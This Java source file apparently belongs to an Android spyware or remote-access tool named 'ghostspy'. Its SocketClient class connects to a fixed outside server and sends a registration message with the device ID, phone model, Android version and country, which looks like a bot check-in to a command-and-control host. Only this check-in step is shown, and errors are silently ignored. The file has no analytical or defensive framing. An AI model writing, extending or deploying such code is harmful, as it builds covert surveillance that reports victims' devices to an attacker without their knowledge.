package com.ghostspy;

import io.socket.client.IO;
import io.socket.client.Socket;
import io.socket.emitter.Emitter;
import org.json.JSONObject;
import java.net.URISyntaxException;

public class SocketClient {
    private Socket socket;
    private String deviceId;

    public SocketClient(String id) {
        this.deviceId = id;
        try {
            IO.Options opts = new IO.Options();
            opts.transports = new String[]{"polling"};
            socket = IO.socket("https://ghostspy.bruang.biz.id", opts);
        } catch (URISyntaxException e) {}
    }

    public void connect() {
        if (socket == null) return;
        socket.on(Socket.EVENT_CONNECT, args -> {
            JSONObject reg = new JSONObject();
            try {
                reg.put("id", deviceId);
                reg.put("ip", "minimal");
                reg.put("model", android.os.Build.MODEL);
                reg.put("android", android.os.Build.VERSION.RELEASE);
                reg.put("region", java.util.Locale.getDefault().getCountry());
                socket.emit("register", reg);
            } catch (Exception e) {}
        });
        socket.connect();
    }
}
